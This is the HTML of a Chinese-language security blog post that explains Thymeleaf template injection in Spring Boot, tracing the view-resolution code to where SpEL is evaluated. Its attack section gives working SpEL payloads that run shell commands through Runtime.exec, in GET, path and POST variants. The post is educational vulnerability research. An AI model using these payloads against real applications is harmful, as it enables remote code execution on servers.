@@ -1,0 +1,364 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Thymeleaf模板注入 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Thymeleaf模板注入 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="实验环境参考：https://github.com/veracode-research/spring-view-manipulation
+背景知识
+片段表达式
+片段表达式语法：
+
+~{templatename::selector}，会在/W..." />
+    <meta name="keywords" content="Java,thymeleaf,SpEL,SSTI" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Thymeleaf模板注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-04-13
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/tZ2VQ2HMT/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/oPmzXqAUjU/" class="post-tag">
+                  # thymeleaf
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/EiKKt5PekL/" class="post-tag">
+                  # SpEL
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/h0Nu9_pAP/" class="post-tag">
+                  # SSTI
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/thymeleaf-mo-ban-zhu-ru.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>实验环境参考：<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p>
+<h1 id="背景知识">背景知识</h1>
+<h2 id="片段表达式">片段表达式</h2>
+<p>片段表达式语法：</p>
+<ul>
+<li><code>~{templatename::selector}</code>，会在/WEB-INF/templates/目录下寻找名为templatename的模版中定义的fragment。</li>
+<li><code>~{templatename}</code>，引用整个<code>templatename</code>模版文件作为<code>fragment</code></li>
+<li><code>~{::selector} </code>或 <code>~{this::selector}</code>，引用来自同一模版文件名为<code>selector</code>的<code>fragmnt</code></li>
+</ul>
+<p>其中<code>selector</code>可以是通过<code>th:fragment</code>定义的片段，也可以是类选择器、ID选择器等。<br>
+当<code>~{}</code>片段表达式中出现<code>::</code>，则<code>::</code>后需要有值，也就是<code>selector</code>。</p>
+<h2 id="预处理表达式">预处理表达式</h2>
+<pre><code>__${expression}__
+</code></pre>
+<blockquote>
+<p>除了所有这些用于表达式处理的功能外，Thymeleaf 还具有预处理表达式的功能。<br>
+预处理是在正常表达式之前完成的表达式的执行，允许修改最终将执行的表达式。<br>
+预处理的表达式与普通表达式完全一样，但被双下划线符号（如__${expression}__）包围。</p>
+</blockquote>
+<h1 id="流程浅析">流程浅析</h1>
+<p>先简单看下渲染一个模板的流程。</p>
+<p>对于下面的 <code>controller</code>（注意：在使用<code>@Controller</code>定义时，返回的<code>index</code>不会被当作字符串，而是会作为一个模板名称）：</p>
+<pre><code class="language-java">@GetMapping(&quot;/&quot;)
+public String index(Model model) {
+    model.addAttribute(&quot;name&quot;, &quot;World&quot;);
+    return &quot;index&quot;;
+}
+</code></pre>
+<p>首先是处理请求<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>的逻辑<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712932311102-6eef5ab3-cf2b-4bc3-a3f1-fd9be12f67dd.png" alt="image.png" loading="lazy"></p>
+<p>前两步是根据请求的URL、HTTP方法等信息查找相应的<strong>Handler</strong>和<strong>Handler Adapter</strong>，具体的处理逻辑也就是执行我们写的<code>controller</code>代码是在</p>
+<pre><code class="language-java">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());
+</code></pre>
+<p>这里返回的<strong>ModelAndView</strong>对象包含了模型数据和视图名称<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712932938073-5769e749-dabf-471c-94d7-171fc60e63ae.png" alt="image.png" loading="lazy"></p>
+<p><code>processDispatchResult</code>会根据<strong>ModelAndView</strong>对象处理视图渲染<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933145805-53ed2640-5b9a-4394-b27d-947a060b6590.png" alt="image.png" loading="lazy"></p>
+<p><code>render</code>中<strong>DispatcherServlet</strong>会调用自己的<code>resolveViewName</code>方法根据视图名称和请求信息选出最适合的<strong>view</strong>对象，然后<strong>view</strong>对象调用它的<code>render</code>方法渲染模版处理请求。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933234854-0fca5626-e9ed-41ac-9b79-366fce0239de.png" alt="image.png" loading="lazy"></p>
+<p><code>DispatcherServlet#resolveViewName</code>会从遍历<code>viewResolvers</code>中存储的<strong>ViewResolver</strong>对象，调用它们的<code>resolveViewName</code>方法来寻找。<code>viewResolvers</code>实在SpringBoot初始化的时候加载的<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933612796-d978b9eb-e611-43fb-aa2f-4250ae7e0edf.png" alt="image.png" loading="lazy"></p>
+<p>这里第一个调用的是<strong>ContentNegotiatingViewResolver</strong>，它不是直接解析视图名称，而是根据请求的内容类型或请求参数决定使用哪个其他视图解析器。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712933664702-4d3b8765-8bf6-4ec0-9d55-8178b2d41d54.png" alt="image.png" loading="lazy"></p>
+<p><code>ContentNegotiatingViewResolver#resolveViewName</code>选出<strong>View</strong>对象可以分为两步：</p>
+<ul>
+<li>获取候选视图：<code>getCandidateViews(viewName, locale, requestedMediaTypes)</code>方法会基于<strong>视图名称</strong>、<strong>地区设置</strong>和<strong>请求的媒体类型</strong>（Accept请求头）获取一系列候选视图。</li>
+<li>选择最佳视图：<code>getBestView(candidateViews, requestedMediaTypes, attrs)</code>方法从候选视图中选择最佳视图。这个选择是基于所<strong>请求的媒体类型</strong>，以及视图是否能够处理这些媒体类型。</li>
+</ul>
+<p>在<code>getCandidateViews</code>方法中可以发现，它依然是遍历自己的<code>viewResolvers</code>中的<strong>ViewResolver</strong>对象，然后调用它们的<code>resolveViewName</code>方法<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934282783-62b8bcda-b7da-44fe-9252-df538f4bcd7e.png" alt="image.png" loading="lazy"></p>
+<p>这里就可以看到<strong>ThymeleafViewResolver</strong>的<code>resolveViewName</code>方法被调用<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934386588-a6c54af4-08a9-4d38-9dae-970f4308d8f1.png" alt="image.png" loading="lazy"></p>
+<p>跟进这个方法，最后我们可以看到<strong>View</strong>对象是通过<code>ThymeleafViewResolver#loadView</code>生成的，这里还没有涉及到模板文件的读取。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712934480852-1885a63f-ebe1-4270-80b0-dd011908c454.png" alt="image.png" loading="lazy"></p>
+<p>在由<code>ContentNegotiatingViewResolver#getBestView</code>选出最佳的<strong>View</strong>对象后，就会调用该对象的<code>render</code>方法。接着我们看下<code>ThymeleafView#renderFragment</code>，<code>ThymeleafView#render</code>的最终调用。</p>
+<p><code>ThymeleafView#renderFragment</code>的处理流程大致可以分为三步：</p>
+<ul>
+<li>渲染Thymeleaf模板前的准备：这里主要是一些变量的检查和上下文的设置。</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935393965-07d4006c-18d4-493f-9bd3-98ad23eb1eec.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li><code>viewtemplateName</code>的解析：漏洞的产生点，代码会根据<code>viewtemplateName</code>中是否含有<code>::</code>来决定是否要对其进行解析，最后解析出<code>templateName</code>变量。</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935621931-02f164fd-9b8d-47b3-91a0-ef0b54de2450.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>渲染模版，处理响应：在做好响应的类型、字符编码等配置后，使用<code>viewTemplateEngine.process</code>方法读取模板文件、解析模板内容、执行表达式、渲染结果等多个步骤。最后将内容返回给客户端</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712935867500-6167221f-714c-4558-9342-97caca9b9b25.png" alt="image.png" loading="lazy"></figure>
+<h1 id="漏洞成因">漏洞成因</h1>
+<p>漏洞的成因就在解析<code>viewTemplateName</code>的代码中，当<code>viewTemplateName</code>中含有<code>::</code>，会用<code>&quot;~{&quot; + viewTemplateName + &quot;}&quot;</code>包裹将其作为一个片段表达式，调用<code>parser.parseExpression</code>进行解析<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712936048123-abc8f184-0b05-4952-bd9d-9a4e4495b8fd.png" alt="image.png" loading="lazy"></p>
+<p>跟进实现，<code>StandardExpressionParser#parseExpression</code>中有一步预处理的流程，根据名字可以猜到它处理的就是表达式中<code>__${expression}__</code>预处理表达式的部分<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712937292709-f75f1916-50d4-408d-a0de-fe5377191773.png" alt="image.png" loading="lazy"></p>
+<p>跟进<code>StandardExpressionPreprocessor#preprocess</code>，如果没有<code>_</code>直接返回<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712937457017-1e2a1796-1461-45da-b850-79e86af0cc78.png" alt="image.png" loading="lazy"></p>
+<p>之后的解析流程会先用正则<code>\_\_(.*?)\_\_</code>匹配出<strong>预处理表达式之间的内容</strong>，再传给<code>StandardExpressionParser.parseExpression</code>进行解析（这是作为了一个变量表达式递归解析？），最后调用解析出来的<strong>IStandardExpression</strong>对象的<code>execute</code>方法<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938072287-061f06bf-8c4c-49fd-a741-303f3cdfa727.png" alt="image.png" loading="lazy"></p>
+<p>在<code>expression.execute</code>的最后会将<strong>预处理表达式之间的内容</strong>作为<strong>SpEL执行表达式</strong>（加入学习列表）解析，进而触发任意代码执行。<br>
+<img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938381093-b1806f25-ee8d-4633-8d95-a8d7004aa291.png" alt="image.png" loading="lazy"></p>
+<p>小结一下：</p>
+<ul>
+<li>漏洞的成因是在<strong>ThymeleafView</strong>对象调用<code>render</code>方法渲染模板的时候产生的，准确的说应该是在解析自己的<code>templateName</code>属性时产生的</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/Thymeleaf_ssti/1712938848792-58c8f143-f455-4006-8959-e2e5512131e3.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>当攻击者可以控制解析的<code>templateName</code>即可产生漏洞，具体而言满足的条件有（来自turn1tup师傅的总结）：
+<ul>
+<li>用户传入的字符串拼接到了<code>Controller</code>方法的返回值中且返回的视图非重定向（重定向优先级最高），或URI路径拼接了用户的输入且<code>Controller</code>方法参数中不带有<code>ServletResponse</code>类型的参数</li>
+<li>视图引擎名称中需要包含<code>::</code>字符串</li>
+<li>被执行表达式字符串前后需要带有两个下划线，即<code>__${EL}__</code>；</li>
+<li>如果POC在URI中，由于URI格式化的原因且我们的POC中带有<code>.</code>符号，所以需要在URI末尾添加<code>.</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="攻击方式">攻击方式</h1>
+<p>根据可控位置的不同，大致有三种利用场景</p>
+<h2 id="select">select</h2>
+<pre><code class="language-java">@GetMapping(&quot;/fragment&quot;)
+public String fragment(@RequestParam String section) {
+    return &quot;index :: &quot; + section; // fragment is tainted
+}
+</code></pre>
+<p>很简单易懂，payload</p>
+<pre><code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}__::.x
+</code></pre>
+<h2 id="path">/path</h2>
+<pre><code class="language-java">@GetMapping(&quot;/path&quot;)
+public String path(@RequestParam String lang) {
+    return &quot;user/&quot; + lang + &quot;/index&quot;; // template path is tainted
+}
+</code></pre>
+<p>payload和上面一样，虽然第一感觉有点反直觉，但看到最后处理的<code>viewTemplateName</code>就懂了</p>
+<pre><code>user/__${new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22).getInputStream()).next()}__::.x/index
+</code></pre>
+<h2 id="uri-path">URI PATH</h2>
+<pre><code class="language-java">@GetMapping(&quot;/doc/{document}&quot;)
+public void getDocument(@PathVariable String document) {
+    log.info(&quot;Retrieving &quot; + document);
+    //returns void, so view name is taken from URI
+}
+</code></pre>
+<p>因为<code>mav</code>返回值为空，所以<code>viewTemplateName</code>会从uri中获取，直接在<code>{document}</code>位置传入payload即可</p>
+<pre><code>/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::.x
+</code></pre>
+<h2 id="其他姿势">其他姿势</h2>
+<p>记下poc</p>
+<pre><code># 构造回显，在最后加两个.
+/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::..
+
+# 最后只加个.也是可以的，不一定必须是.x
+/doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__::.
+
+# :: 位置不用固定
+::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__
+
+# POST方式
+POST /path HTTP/1.1
+Host: localhost:8090
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 135
+
+lang=::__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d__
+
+# 省略__
+# 情况如下
+@RequestMapping(&quot;/path&quot;)
+public String path2(@RequestParam String lang) {
+    return lang; //template path is tainted
+}
+
+GET /path2?lang=$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20calculator%22).getInputStream()).next()%7d::.x HTTP/1.1
+Host: localhost:8090
+</code></pre>
+<h1 id="参考">参考</h1>
+<p><a href="https://www.cnblogs.com/CoLo/p/15507738.html">https://www.cnblogs.com/CoLo/p/15507738.html</a><br>
+<a href="https://xz.aliyun.com/t/9826?">https://xz.aliyun.com/t/9826</a><br>
+<a href="https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/">https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/</a><br>
+<a href="https://github.com/veracode-research/spring-view-manipulation">https://github.com/veracode-research/spring-view-manipulation</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">背景知识</a>
+<ul>
+<li><a href="#%E7%89%87%E6%AE%B5%E8%A1%A8%E8%BE%BE%E5%BC%8F">片段表达式</a></li>
+<li><a href="#%E9%A2%84%E5%A4%84%E7%90%86%E8%A1%A8%E8%BE%BE%E5%BC%8F">预处理表达式</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B5%81%E7%A8%8B%E6%B5%85%E6%9E%90">流程浅析</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0">漏洞成因</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">攻击方式</a>
+<ul>
+<li><a href="#select">select</a></li>
+<li><a href="#path">/path</a></li>
+<li><a href="#uri-path">URI PATH</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF">其他姿势</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/java-rmi-xue-xi-bi-ji-yi/">
+              <h3 class="post-title">
+                Java RMI 学习笔记（一）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
